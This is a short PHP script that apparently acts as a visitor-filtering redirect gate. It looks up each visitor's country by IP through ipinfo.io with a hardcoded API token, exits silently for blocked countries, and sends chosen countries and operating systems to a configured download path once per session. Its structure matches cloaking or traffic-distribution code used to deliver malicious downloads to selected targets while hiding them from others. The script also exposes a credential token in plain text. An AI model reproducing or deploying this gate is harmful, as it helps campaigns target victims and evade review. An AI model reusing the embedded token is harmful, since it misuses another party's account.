<?php

// session start
session_start();

// Load JSON settings file
$settingsFile = './api/settings.json'; // Path to the settings file
$settingsFileStr = file_get_contents($settingsFile);
$settings = json_decode($settingsFileStr, false);

$pageStatus = $settings->PageStatus;
$version = $settings->Version->Enabled;
$GEO = $settings->GEO;
$BlockedGEO = $settings->BlockedGEO;
$userOS = getOS();

// Function to get user's OS
function getOS() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    if (preg_match('/Windows/i', $userAgent)) return 'Windows';
    if (preg_match('/Macintosh|Mac OS X/i', $userAgent)) return 'macOS';
    if (preg_match('/Android/i', $userAgent)) return 'Android';
    if (preg_match('/iPhone|iPad/i', $userAgent)) return 'iPhone';
    return 'Unknown OS';
}


// Get the main domain dynamically
$mainDomain = $_SERVER['HTTP_HOST']; // Extracts the domain name, like "domain.com"

// get country code by ip address
$userIP = $_SERVER['REMOTE_ADDR'];
$ipInfo = json_decode( file_get_contents('http://ipinfo.io/'.$userIP.'?token=6197b6ab0656f9') );

if ($pageStatus == 'ON') {
	if (!isset($_SESSION['isDownload']) || $_SESSION['isDownload'] != '1') {
		if ( in_array($ipInfo->country, $BlockedGEO) ) exit();

		if ( in_array($ipInfo->country, $GEO) )  {
		    if (in_array($userOS, $settings->OS)) {
    		    header("Location: https://$mainDomain/$version");
    		}
		}
		
	}
}


?>